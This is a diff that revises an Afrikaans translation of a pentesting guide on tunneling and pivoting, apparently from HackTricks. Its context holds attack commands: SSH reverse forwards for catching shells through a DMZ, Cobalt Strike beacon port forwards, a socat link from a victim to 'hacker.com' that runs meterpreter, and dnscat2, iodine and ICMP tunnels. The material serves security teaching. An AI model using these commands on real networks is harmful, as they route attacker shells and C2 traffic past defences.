@@ -51,13 +51,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enigiemand
+Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enige plek
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reverse Port Forwarding
+### Omgekeerde Poort Voorwaartse
 
-Dit is nuttig om omgekeerde shells van interne gasheer deur 'n DMZ na jou gasheer te kry:
+Dit is nuttig om omgekeerde skale van interne gasheer deur 'n DMZ na jou gasheer te kry:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -145,7 +145,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> In hierdie geval is die **poort geopen in die beacon-gasheer**, nie in die Team Server nie, en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
+> In hierdie geval is die **poort geopen in die beacon gasheer**, nie in die Team Server nie, en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -153,14 +153,14 @@ rportfwd stop [bind port]
 Om op te let:
 
 - Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om tussen individuele masjiene te relay nie**.
-- Verkeer word **binne Beacon se C2-verkeer getonneld**, insluitend P2P skakels.
-- **Admin regte is nie nodig nie** om omgekeerde poort forwards op hoë poorte te skep.
+- Verkeer word **getonnel binne Beacon se C2 verkeer**, insluitend P2P skakels.
+- **Admin regte is nie nodig** om omgekeerde poort forwards op hoë poorte te skep nie.
 
 ### rPort2Port plaaslik
 
 > [!WARNING]
-> In hierdie geval, die **poort word in die beacon-gasheer geopen**, nie in die Spanbediener nie en die **verkeer word na die Cobalt Strike-kliënt gestuur** (nie na die Spanbediener nie) en van daar na die aangeduide gasheer:poort
-```
+> In hierdie geval, die **poort word in die beacon gasheer geopen**, nie in die Spanbediener nie en die **verkeer word na die Cobalt Strike kliënt gestuur** (nie na die Spanbediener nie) en van daar na die aangeduide gasheer:poort
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-U kan 'n **nie-geoutentiseerde proxy** omseil deur hierdie lyn in plaas van die laaste een in die slagoffer se konsole uit te voer:
+Jy kan 'n **nie-geoutentiseerde proxy** omseil deur hierdie lyn in plaas van die laaste een in die slagoffer se konsole uit te voer:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -356,7 +356,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Nou kan ons **verbinde** met die **slagoffer** oor **RDP** met **`mstsc.exe`**, en ons behoort 'n **prompt** te ontvang wat sê dat die **SocksOverRDP plugin geaktiveer is**, en dit sal **luister** op **127.0.0.1:1080**.
 
-**Verbind** via **RDP** en laai op & voer die `SocksOverRDP-Server.exe` binêre uit op die slagoffer masjien:
+**Verbind** via **RDP** en laai op & voer die `SocksOverRDP-Server.exe` binêre in die slagoffer masjien uit:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -411,7 +411,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Die tonnel sal baie stadig wees. Jy kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur te gebruik:
+Die tonnel sal baie stadig wees. U kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur te gebruik:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -435,14 +435,14 @@ Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershel
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Port forwarding met dnscat**
+#### **Havenportering met dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
 #### Verander proxychains DNS
 
-Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur die socks proxy. Deur **default** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
+Proxychains onderskep `gethostbyname` libc oproep en tonnels tcp DNS versoek deur die socks proxy. Deur **verstek** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** stel.
 
 ## Tonnels in Go
 
@@ -455,7 +455,7 @@ Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is nodig in beide stelsels om tun adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
+Root is nodig in beide stelsels om tun-adapters te skep en data tussen hulle te tonnel deur ICMP echo versoeke.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -479,7 +479,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **is 'n hulpmiddel om oplossings in een opdraglyn aan die internet bloot te stel.**\
+[**ngrok**](https://ngrok.com/) **is 'n hulpmiddel om oplossings in een opdraglyn aan die Internet bloot te stel.**\
 _Expositie URI is soos:_ **UID.ngrok.io**
 
 ### Installasie
